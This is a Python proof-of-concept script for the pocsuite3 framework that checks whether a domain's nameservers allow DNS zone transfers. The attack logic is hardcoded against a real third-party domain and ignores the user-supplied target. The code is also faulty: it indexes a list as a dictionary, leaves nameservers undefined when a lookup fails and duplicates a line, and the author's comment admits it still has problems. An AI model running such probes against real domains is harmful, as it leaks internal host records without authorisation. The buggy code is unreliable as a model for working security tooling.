# -*- coding: utf-8 -*-
# author: seven
# 这个脚本还有问题

from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY
from pocsuite3.lib.core.threads import run_threads
import socket
from dns import resolver, query, exception


class Transferrer(object):

    def __init__(self, domain):
        self.domain = domain
        try:
            nss = resolver.query(domain, 'NS')
            self.nameservers = [ str(ns) for ns in nss ]
        except:
            pass


    def transfer(self):
        result = []
        for ns in self.nameservers:
            z = self.query(ns)
            if z!=None:
                result.append(str(self.domain)+':'+str(ns))
        return result
        


    def query(self, ns):
        nsaddr = self.resolve_a(ns)
        try:
            z = self.pull_zone(nsaddr)
        except (exception.FormError, socket.error, EOFError) as e:
            logger.info(str(e))
            return None
        else:
            return z


    def resolve_a(self, name):
        """Pulls down an A record for a name"""
        nsres = resolver.query(name, 'A')
        return str(nsres[0])


    def pull_zone(self, nameserver):
        """Sends the domain transfer request"""
        q = query.xfr(nameserver, self.domain, relativize=False, timeout=2)
        zone = ""   
        for m in q: 
            zone += str(m)
        if not zone:
            raise EOFError
        return zone


class DNSTransferPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['seven']
    vulDate = 'Jul 24, 2020'
    createDate = 'Jul 24, 2020'
    name = 'DNS域传送漏洞'
    appName = 'DNS'
    appVersion = 'v1.0.0'
    vulType = ''
    protocol = 'DNS'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        result = {}
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 53

        t = Transferrer('sgcc.com.cn')
        result = t.transfer()
        if result:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['evidence'] = '\n'.join(result)
            result['VerifyInfo']['evidence'] = '\n'.join(result)
        return self.parse_output(result)
    def _attack(self):
        return self._verify()

register_poc(DNSTransferPOC)